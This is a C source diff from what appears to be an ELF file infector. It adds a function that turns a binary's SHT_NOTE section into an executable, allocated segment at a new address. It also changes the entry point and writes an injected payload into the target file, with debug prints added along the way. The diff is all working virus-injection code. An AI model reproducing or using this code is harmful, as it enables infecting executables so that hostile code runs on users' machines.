@@ -6,6 +6,8 @@ int FORCE_INLINE metamorph_segment(t_data data)
 	Elf64_Ehdr	e_hdr;
 	int		len;
 
+	ft_putchar('5');
+	ft_putchar('\n');
 	LSEEK(data.fd, 0, SEEK_SET);
 	READ(data.fd, &e_hdr, sizeof(e_hdr));
 	len = e_hdr.e_phnum;
@@ -29,12 +31,50 @@ int FORCE_INLINE metamorph_segment(t_data data)
 	return (0);
 }
 
+int FORCE_INLINE metamorph_section(t_data data)
+{
+	Elf64_Shdr	s_hdr;
+	Elf64_Ehdr	e_hdr;
+	int		len;
+
+	ft_putchar('4');
+	ft_putchar('\n');
+	LSEEK(data.fd, 0, SEEK_SET);
+	READ(data.fd, &e_hdr, sizeof(e_hdr));
+	len = e_hdr.e_shnum;
+	LSEEK(data.fd, e_hdr.e_shoff, SEEK_SET);
+	do {
+		READ(data.fd, &s_hdr, sizeof(s_hdr));
+		if (s_hdr.sh_type == SHT_NOTE)
+		{
+			s_hdr.sh_type = SHT_PROGBITS;
+			s_hdr.sh_flags = SHF_EXECINSTR | SHF_ALLOC;
+			s_hdr.sh_addr = data.bin.new_entry;
+			s_hdr.sh_offset = data.bin.new_entry - data.bin.v_addr;
+			s_hdr.sh_link = 0;
+			s_hdr.sh_info = 0;
+			s_hdr.sh_addralign = 0;
+			s_hdr.sh_entsize= 0;
+			LSEEK(data.fd, sizeof(s_hdr) * -1, SEEK_CUR);
+			WRITE(data.fd, &s_hdr, sizeof(s_hdr));
+			return (1);
+		}
+		len -= 1;
+	} while (len) ;
+	return (0);
+}
+
 
 int inject(t_data data)
 {
 	u64 offset;
+
+	ft_putchar('3');
+	ft_putchar('\n');
 	data.bin = get_infos(data.fd);
 	if (!metamorph_segment(data))
+		return (0);
+	if (!metamorph_section(data))
 		return (0);
 	/* change entry point */
 	LSEEK(data.fd, 24, SEEK_SET);
@@ -45,6 +85,7 @@ int inject(t_data data)
 	/* write to file */
 	WRITE(data.fd, &payload, data.infos.pl_size);
 	CLOSE(data.fd);
-	WRITE(1, "Done\n", 5);
+	ft_putchar('6');
+	ft_putchar('\n');
 	return (1);
 }
